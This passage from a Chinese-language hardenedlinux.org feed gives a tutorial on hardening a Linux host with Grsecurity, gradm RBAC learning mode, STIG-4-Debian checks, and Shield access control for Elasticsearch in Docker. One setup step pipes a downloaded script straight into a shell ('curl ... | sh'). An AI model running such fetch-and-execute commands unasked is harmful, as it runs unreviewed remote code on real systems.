&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下载gradm：（或者到Grsecurity官网下载最新版）&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wget http://grsecurity.net/stable/gradm-3.1-201507191652.tar.gz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;开始安装：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar zxvf gradm-3.1-201507191652.tar.gz
cd gradm
make nopam (无PAM支持）
sudo make install
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;安装结束后，要求输入gradm的管理密码，注意不要与root密码相同，否则降低了Grsecurity的安全防护。
另外，将会在/sbin下安装gradm和grlearn程序。并在/etc/grsec目录下生成learn_config和policy两个文件。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;关于使用gradm对系统权限进行细分将在下面提及。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;19)	卸载旧内核(&lt;em&gt;Note：dpkg确定内核版本号，remove掉相应的内核deb包，请替换后再执行命令&lt;/em&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dpkg -l | grep linux-headers（若没有3.16的headers则可略去下面的apt-get remove linux-headers-&#39;&#39;）
dpkg -l | grep linux-image
sudo apt-get remove linux-headers-&#39;&#39; linux-image-&#39;&#39;(注意：这一步使用前两个命令得到的信息替换&#39;&#39;里的内容）
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此时再重启计算机会发现现在只有Linux 3.14.48-grsec的内核了。&lt;/p&gt;

&lt;p&gt;20） 卸载编译工具链&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get remove kernel-package build-essential
sudo apt-get remove libncursesada-dbg  libncursesada3-dev libncursesada-doc libncurses5-dbg libncurses5-dev libncursesw5-dbg  libncurses-gst libncursesw5-dev libncursesada3
sudo apt-get autoremove
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;至此Grsecurity的第一步加固完成。若以后在系统运行时需要修改某些特性，可在/etc/sysctl.conf中对相应的条目进行修改。具体条目对应的选项请参看&lt;a href=&quot;https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&quot;&gt;https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;stig&quot;&gt;3、使用STIG验证&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;STIG（安全技术实现指南）是由DISA为了IT安全态势给DoD(美国国防部）提供的一套防御指南。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;NOTE：STIG是一组庞大的集合，且针对OS的部分官方只针对RHEL。这里的STIG指的是h4rdenedzer0(http://hardenedlinux.org/about/) 的stig-4-debian项目&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1） 将github中STIG的脚本文件克隆到本地：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/hardenedlinux/STIG-4-Debian.git
cd STIG-4-Debian
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2） 使用方法&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;usage: check.sh [options]

  -c    Output Log with catable colors
  -s    Perform STIG checking with NORMAL output log
  -v    Show version
  -h    Show this message
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3） 执行脚本&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo ./check.sh -s
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4) 脚本对内核执行完毕后我们可以看到在/var/log下生成了一个100K左右名为STIG-Checking-2015-??-??.log的日志，即为STIG对内核进行安全扫描的结果。&lt;/p&gt;

&lt;p&gt;其中，日志中为FAIL的条目表示未达到STIG安全标准的项目，PASS的项目为通过STIG验证的项目。我们接下来要做的工作就是通过修改内核选项尽可能地使所有FAIL的条目变成PASS。&lt;/p&gt;

&lt;p&gt;5）示例：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/d8c6c741jw1evrrl7g6obj20m60dk409.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在上图中可看到一个FAIL的条目是”The /etc/shadow file must be group-owned by root”,Vulnerability是该条目的漏洞分析，Fix text是解决方法。&lt;/p&gt;

&lt;p&gt;为了解决该问题，执行Fix text中提示的命令：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;chgrp root /etc/shadow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;修改后：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/d8c6c741jw1evrs5ykn7bj20kn018t8m.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到，按Fix text修改后该条目通过STIG验证。&lt;/p&gt;

&lt;p&gt;6）STIG总结&lt;/p&gt;

&lt;p&gt;STIG是由DISA为了IT安全态势给美国国防部提供的一套安全指南，据说DoD的应用在上线前都会使用这个指南进行安全强化。在日志内容上看来也的确有不少值得借鉴之处。&lt;/p&gt;

&lt;p&gt;综上，尽可能把其余的FAIL条目按照STIG标准进行修改达到PASS，使系统安全到达更高一个层次。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;以上即为Linux内核加固的实践内容。接下来是结合ElasticSearch进行业务层面的加固，具体部分包括：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在docker下运行ES，并使用Shield对ES进行加固————安全认证及RBAC系统&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在物理机上配置RBAC系统，达到系统最小权限————主要为gradm工具的使用&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;shieldelasticsearch&quot;&gt;4、使用Shield对ElasticSearch进行业务级别的加固&lt;/h2&gt;

&lt;h3 id=&quot;shield&quot;&gt;介绍Shield&lt;/h3&gt;

&lt;p&gt;Shield是一个为了使ElasticSearch更安全而产生的一个插件。在Shield的安全加固中包括安全认证机制，RBAC系统，IP过滤和系统审计。&lt;/p&gt;

&lt;p&gt;下面的加固将通过配置安全认证机制和RBAC系统来演示加固流程。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;### 配置ElasticSearch

1） 安装docker

    apt-get install curl
    curl -sSL https://get.docker.com | sh

验证docker是否安装成功：`$ docker`

2）启动docker

    sudo service docker start
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;shield-1&quot;&gt;安装Shield&lt;/h3&gt;

&lt;p&gt;1) 安装需求:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;安装了Java7或更新版本&lt;/li&gt;
  &lt;li&gt;Shield plugin必须在集群的每个节点都安装，并且每个节点安装完后都要重启。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;2) 启动ES的每个节点：（oaDataNode1等是自定义的节点名称）&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo service docker start
sudo weave launch
sudo weave start 10.0.0.1/24 oaDataNode1
sudo weave start 10.0.0.2/24 oaDataNode2
sudo weave start 10.0.0.3/24 oaDataNode3
sudo weave start 10.0.0.4/24 oaDataNode4
sudo weave expose 10.0.0.254/24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3) 首先进入Docker：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo docker exec -it oaDataNode1 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4) 进入ES的安装目录下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd /usr/es/elasticsearch-1.7.0/bin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5) 安装ElasticSearch许可插件和Shield插件：：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./plugin -i elasticsearch/license/latest
./plugin -i elasticsearch/shield/latest
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）重启ElasticSearch服务&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo weave stop
sudo docker stop oaDataNode2 oaDataNode1 oaDataNode3 oaDataNode4
sudo weave launch
sudo weave start 10.0.0.1/24 oaDataNode1
sudo weave start 10.0.0.2/24 oaDataNode2
sudo weave start 10.0.0.3/24 oaDataNode3
sudo weave start 10.0.0.4/24 oaDataNode4
sudo weave expose 10.0.0.254/24
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;section-1&quot;&gt;安全认证模块&lt;/h3&gt;

&lt;p&gt;1) 新建一个ElasticSearch管理员账户&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./esusers useradd es_admin -r admin(新建一个名为es_admin的用户，角色为admin)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;现在可以尝试着用RESTFUL API来访问ElasticSearch，会发现访问被拒绝&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;curl -XGET &#39;http://localhost:9200/&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在请求上加上用户名和密码即可：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;curl -u es_admin -XGET &#39;http://localhost:9200/&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;由此可知，使用Shield新建ES账户后，可以为ES添加严格个安全认证机制。&lt;/p&gt;

&lt;h3 id=&quot;rbac&quot;&gt;RBAC模块&lt;/h3&gt;

&lt;h4 id=&quot;section-2&quot;&gt;知识准备&lt;/h4&gt;

&lt;p&gt;Shield实现了RBAC权限管理系统。在RBAC系统下，所有的行为都会被默认限制，所有用户的权限都与“角色”联系在一起，而每个“角色”代表了一组允许的行为。&lt;/p&gt;

&lt;h5 id=&quot;roles-permissions-and-privileges&quot;&gt;1）Roles, Permissions and Privileges的概念&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Privileges：代表一组用户在ElasticSearch中允许执行的行为。例如：是否能运行query就是一种Privileges。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Permissions：一组结合一个或多个“安全对象（Secured Object）”的Privileges。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;在ElasticSearch中有两种Secured Object：
&amp;gt;Cluster：Cluster permissions提供了集群范围内的管理、侦听权限。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Index：Index permissions提供了数据通道，包括在集群中特定索引的管理和侦听。&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;roles：一组命名的Permission的组合。例如：你可以定义一个“日志管理员”的role，他允许对名字为“logs-*”的索引做任何操作，但对其他文件却没有任何权限。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Note:作为ES的管理员，你需要定义一些角色，并将每个用户分配到这些角色上。&lt;/em&gt;&lt;/p&gt;

&lt;h5 id=&quot;roles&quot;&gt;2) 定义roles&lt;/h5&gt;

&lt;p&gt;Roles在ES_HOME/config/shield中的roles.yml文件中定义，其中的每个条目都定义了唯一一个role和相应的permission。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note：roles.yml文件在每个节点中独立管理。所以在拥有多个节点的集群中，所有节点的该文件都需要修改。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;roles.yml文件的格式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# All cluster rights
# All operations on all indices
admin:
  cluster: all
  indices:
    &#39;*&#39;: all

# Monitoring cluster privileges
# All operations on all indices
power_user:
  cluster: monitor
  indices:
    &#39;*&#39;: all

# Only read operations on indices named events_*
events_user:
  indices:
    &#39;events_*&#39;: read
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;具体的Privileges请参见：&lt;a href=&quot;http://&quot;&gt;https://www.elastic.co/guide/en/shield/current/reference.html#ref-actions-list&lt;/a&gt;&lt;/p&gt;

&lt;h5 id=&quot;esusers&quot;&gt;3） 使用esusers工具管理用户&lt;/h5&gt;

&lt;p&gt;esusers工具主要控制在ES_HOME/config/shield/的两个文件————users和users_roles。这两个文件存储着所有esuser域的信息，并且会在ES启动时被shield读取。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note：roles.yml文件在每个节点中独立管理。所以在拥有多个节点的集群中，所有节点的该文件都需要修改。&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;users文件：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;users文件储存着所有用户和他们的密码。每个条目是每个用户的名字和密码的hash值。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;users_roles文件：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;users_roles存储的是每个用户相联系的roles&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h6 id=&quot;a&quot;&gt;A、添加用户&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;esusers useradd &amp;lt;username&amp;gt;
esusers useradd &amp;lt;username&amp;gt; -r &amp;lt;comma-separated list of role names&amp;gt; 使用-r参数定义用户的roles，roles间用逗号隔开
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ES在启动时会读取用户和角色信息，应该使用开启ES的用户使用useradd添加用户。&lt;/p&gt;

&lt;h6 id=&quot;b&quot;&gt;B、打印用户信息&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;esusers list
esusers list &amp;lt;username&amp;gt; 这个命令打印指定用户信息
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&quot;c&quot;&gt;C、修改用户密码&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;esusers passwd &amp;lt;username&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&quot;d&quot;&gt;D、分配用户角色&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;esusers roles &amp;lt;username&amp;gt; -a &amp;lt;roles&amp;gt; -r &amp;lt;roles&amp;gt;
-a指定添加，-r指定移除
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&quot;e&quot;&gt;E、删除用户&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;esusers userdel &amp;lt;username&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;rbac-1&quot;&gt;RBAC加固实践&lt;/h4&gt;

&lt;p&gt;1） 修改roles.yml文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd /usr/es/elasticsearch-1.7.0/config/shield
vim roles.yml
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在文件的末尾加入如下内容：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Data_user: #Data_user 角色定义
  indices:  #index部分
    &#39;*&#39;: crub  #指定Data_user可以读写所有indices

Server_user:  #Serve_user 角色定义
  cluster: cluster:admin/nodes/restart, cluster:admin/nodes/shutdown
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2） 添加两个用户user_Data和user_Server&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;esusers useradd user_data -r Data_user
esusers useradd user_server -r Server_user
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这时，用不同的用户登陆ES将可以进行不同的操作：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;user_data：读写ES的所有文件&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;user_server:启动或关闭ES服务&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;rbac-2&quot;&gt;5、完善物理机RBAC系统，达到最小权限要求&lt;/h2&gt;

&lt;h3 id=&quot;section-3&quot;&gt;知识准备&lt;/h3&gt;

&lt;p&gt;之前讲解了ElasticSearch上的RBAC系统的配置。在Grsecurity中也提供了RBAC权限控制系统，而且比ES中的划分更细致更严格。&lt;/p&gt;

&lt;p&gt;管理物理机中的系统主要依靠gradm工具。使用&lt;code&gt;gradm --help&lt;/code&gt;获得gradm的用法：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# gradm --help
gradm 3.1
grsecurity RBAC administration and policy analysis utility

Usage: gradm [option] ... 

Examples:
        gradm -P
        gradm -F -L /etc/grsec/learning.logs -O /etc/grsec/policy
Options:
        -E, --enable    Enable the grsecurity RBAC system
        -D, --disable   Disable the grsecurity RBAC system
        ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/etc/grsec/policy文件是RBAC系统的核心。在RBAC启动后，它会根据该文件中所写定的策略对系统进行严格的访问控制。&lt;/p&gt;

&lt;h4 id=&quot;policyrole-subject-object&quot;&gt;policy中的三个概念role, subject, object&lt;/h4&gt;

&lt;p&gt;同Shield的RBAC相似，Grsecurity的RBAC也具有三个关于角色和权限的概念。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;role（角色）：如“role admin sA“，“role default ”，”role root uG“，表明有三个角色，分别是admin , default, root&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Roles: Users and groups on the system
在policy中声明即可以定义角色，语法为”role &amp;lt; role name&amp;gt; &amp;lt; parameter&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;grsecurity中的角色分为用户角色，组角色，缺省角色（default），还有个管理员角色。定义不同角色需要有不同的参数。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;NOTE：grsecurity的角色与用户是一对一的。假设有tester用户，属于test组，那么tester用户登录后，会先在policy文件中匹配名为tester用户角色，如果没有，就会去匹配叫test的组角色，如果还没有，那么tester用户进入系统后的角色会是default（default角色在配置文件里面定义）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;也就是说，tester用户登录后，不是tester用户角色，就是test组角色，要么就是default缺省角色，不可能进入其他policy中定义的角色。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;subject（程序），每个subject中首先定义了一个可执行程序（注意，一个subject中只定义一个可执行程序，要对多个可执行程序进行定义的话，就需要多个subject），或者更准确一点，定义了一个运行在系统中的进程。然后后面跟着一系列的object，用来规定当前这个进程的权限。每个角色定义的后面都可以跟一个或多个subject&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Subjects: Processes and directories
参数：
&amp;gt;h 这个进程是隐藏的，只能够被具有v模式的进程看到；
v 具有这个模式的进程拥有察看隐藏进程的能力；
p 进程是受保护的，这种模式的进程只能被具有k模式的进程杀死；
k 具有这个模式的进程可以杀死处于保护模式（p）的进程；
l 为这个进程打开学习模式；
o 撤销ACL继承&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;object（对象）：每个subject中都会有若干的object，表示每个进程都有若干个操作对象，这些操作对象一般来说都是一些目录，文件等等，用来规定当前这个subject中的进程对这些文件拥有哪些权限&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Objects: Files and PaX flags
参数：
&amp;gt;r 这个对象可以打开阅读；
  w 这个对象可以打开写或者添加；
  o 这个对象可以打开添加；
  h 这个对象是隐藏的；
  i 这个模式只用于二进制可执行文件。当这个对象被执行时，它继承所在主体进程的访问控制列表；
  x: 这个模式代表文件可执行&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;NOTE：配置文件中关于subject和object的所有路径都必须是绝对路径&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;section-4&quot;&gt;例：&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;role root uG
subject /
subject /usr/bin/ssh
/etc/ssh/ssh_config r
表示/usr/bin/ssh这个进程对/etc/ssh/ssh_config这个文件有读权限（r）。更进一步讲，这个subject位于角色root后面，所以这两行策略的含义就是以root角色运行ssh时，ssh进程对/etc/ssh/ssh_config有读权限。该策略只定义在了root角色中，对于其他角色不起作用。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;缺省ACL&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;注意：在每一个角色中，都必须有一个subject /，表示一个缺省的ACL，如果没有这个缺省的ACL，grsecurity启动时会报错同时启动失败。当以一个角色登录系统后，如果要执行的可执行程序没有被某个subject定义，那么，该程序就会采用subject /中的缺省定义。例如root角色，没有对cat命令进行定义，所以以root角色执行cat命令时，ACL系统就会参照subject /中的定义来控制cat进程对文件的访问。
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;rbac-3&quot;&gt;部署RBAC系统&lt;/h3&gt;

&lt;p&gt;Grsecurity的policy文件极其繁大复杂，通过手工几乎不可能完成一个具有安全效力的规则文件。所幸Grsecurity为RBAC系统提供了学习机制，即可以通过你在学习机制下进行的操作自动配置policy文件。&lt;/p&gt;

&lt;p&gt;Grsecurity的学习模式分为全系统学习模式跟基于角色的学习模式，在这里我们使用全系统学习模式:&lt;/p&gt;

&lt;p&gt;1） 开启全系统学习模式&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo gradm -F -L /etc/grsec/learning.logs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/d8c6c741jw1evsx0lb4fij20pn02u0ta.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如图所示，RBAC学习模式开启成功。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;从现在开始，gradm将记录下你的一切操作。&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;NOTE：&lt;/em&gt;初次启动时RBAC可能会报出一些ERROR，原因是默认的policy文件没有配置完全：如图，该ERROR为未给shutdown用户设置密码。按照提示执行&lt;code&gt;gradm -P shutdown&lt;/code&gt;并设置密码即可。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/d8c6c741jw1evswtm71ylj20q904gmxv.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2) 进行一些系统运行时正常的必要的操作，并重复至少4遍，以使gradm将操作记录下来&lt;/p&gt;

&lt;p&gt;&lt;em&gt;NOTE：不要在学习模式下进行进行管理员操作，如果需要此类操作，先切换到RBAC管理员角色：&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gradm -a admin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;在高危操作结束后，记得从管理员角色退出：&lt;code&gt;gradm -u&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3） 以针对ElasticSearch业务的加固为例，对RBAC进行配置：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;业务分析：&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在docker中的ES内设置两个用户，一个只允许对其中数据进行读写操作，一个只允许在docker内部重启ES服务；这一步已在前文Shield的加固中实现。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在docker外设置一个本地用户，其除了拥有对本地系统的管理权限之外，还应对运行着ES业务的docker拥有启停等操作的权限；但不应拥有进入docker内部的权限。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在全系统学习模式下，对普通用户执行如下命令：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;启动docker:
sudo service docker start
sudo weave launch
sudo weave start 10.0.0.1/24 oaDataNode1
sudo weave start 10.0.0.2/24 oaDataNode2
sudo weave start 10.0.0.3/24 oaDataNode3
sudo weave start 10.0.0.4/24 oaDataNode4
sudo weave expose 10.0.0.254/24

关闭docker：
sudo weave stop
sudo docker stop oaDataNode2 oaDataNode1 oaDataNode3 oaDataNode4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;重复执行至少4遍。&lt;/p&gt;

&lt;p&gt;4）关闭RBAC&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gradm -D
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这一步是必要的，因为它强制将学习模式的缓存写入磁盘。如果没有关闭gradm就生成policy，可能会导致学习记录的丢失。&lt;/p&gt;

&lt;p&gt;此时查看learning.logs会看见里面有很多命令。&lt;/p&gt;

&lt;p&gt;4） 生成policy文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gradm -F -L /etc/grsec/learning.logs -O /etc/grsec/policy
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;NOTE：执行该命令前应该确保学习模式已经记录了足够多安全的操作，否则再次启动RBAC时将导致无法管理系统。&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;section-5&quot;&gt;结语&lt;/h1&gt;

&lt;p&gt;该文档通过使用Grsecurity和Shield对系统及ES进行了一系列的加固，虽然所做的所有措施只针对与ES有关的业务，但也能大体描绘出一个最小权限系统加固的轮廓。在其他不同的环境下依然能够按照这个思路对系统进行安全加固。&lt;/p&gt;

&lt;p&gt;Grsecurity和Shield都是无比强大的加固武器，通过STIG检测的系统更是拥有更高的安全性。文档只是粗勒地描绘出一套加固思路，更多安全措施请参考Grsecurity和Shield的官方文档。&lt;/p&gt;

&lt;h1 id=&quot;todo&quot;&gt;TODO&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;内核调参数，主要针对TCP/IP性能（针对DoS）和安全的一系列参数需要调整，场景化的情况下根据一款具体的硬件配置来进行调参。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Iptables/netfilter规则，这个可以根据具体的业务场景来定制。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;（重点）安装部署的一个STIG-compliance的系统，效果是在安装步骤完成后，stig-4-debian自动扫描出的结果应该全部或者大部分通过。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PaX/Grsec的config可以细化，这个未来我们会把针对不同场景的config归档。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Grsec的RBAC规则使用learning mode只是把规则抓出来，和AppArmor的aa-genprof/aa-logprof类似，加固的原则是针对的RBAC/MAC规则都必须经过review，这一步工作也需要加强。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;reference&quot;&gt;Reference&lt;/h1&gt;

&lt;p&gt;1） Grsecurity官方文档：&lt;a href=&quot;http://&quot;&gt;https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options#Address_Space_Layout_Randomization&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2） gradm官方文档：&lt;a href=&quot;http://&quot;&gt;https://en.wikibooks.org/wiki/Grsecurity/The_Administration_Utility&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3） Shield官方文档：&lt;a href=&quot;http://&quot;&gt;https://www.elastic.co/guide/en/shield/current/index.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4） hardenedlinux社区：&lt;a href=&quot;http://&quot;&gt;http://hardenedlinux.org/&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 06 Sep 2015 22:42:00 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/09/06/hardening-es-in-docker-with-grsec.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/09/06/hardening-es-in-docker-with-grsec.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>PaX/Grsecurity配置选项</title>
        <description>&lt;p&gt;By: CipherGateway&lt;/p&gt;

&lt;p&gt;Wiki网址：https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&lt;/p&gt;

&lt;h1 id=&quot;grsecurity&quot;&gt;Grsecurity配置选项&lt;/h1&gt;

&lt;p&gt;[TOC]&lt;/p&gt;

&lt;h2 id=&quot;configuration-method&quot;&gt;Configuration Method（配置选项）&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Automatic(自动配置)&lt;/strong&gt; 【使用此选项，你只需回答一些你希望如何配置内核的问题，Grsecurity和Pax将自动以此标准并按照最通用化完成配置。如果你还想定制其他标准，custom configuration自定义选项的选择同样会生效&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Custom（自定义配置）&lt;/strong&gt;【你将完全手动定制Grsecurity和Pax】&lt;/p&gt;

&lt;h4 id=&quot;usage-type&quot;&gt;Usage Type（内核用途）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Server&lt;/strong&gt; 【如果你打算将此作为一个服务器的内核】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Desktop&lt;/strong&gt; 【如果你打算将此作为一个桌面操作系统的内核】&lt;/p&gt;

&lt;h4 id=&quot;virtyalization-type&quot;&gt;Virtyalization Type（虚拟化技术类型）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;None&lt;/strong&gt; 【内核将运行在纯物理机上】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Guest&lt;/strong&gt; 【内核将被运行在虚拟机上】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Host&lt;/strong&gt; 【内核将被运行在宿主机上】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;(X) EPT/RVI Processor Support&lt;/strong&gt; 【Choose this option if your CPU supports the EPT or RVI features of 2nd-gen hardware virtualization.This allows for additional kernel hardening protections to operate without additional performance impact.
To see if your Intel processor supports EPT, see: http://ark.intel.com/Products/VirtualizationTechnology (Most Core i3/5/7 support EPT)
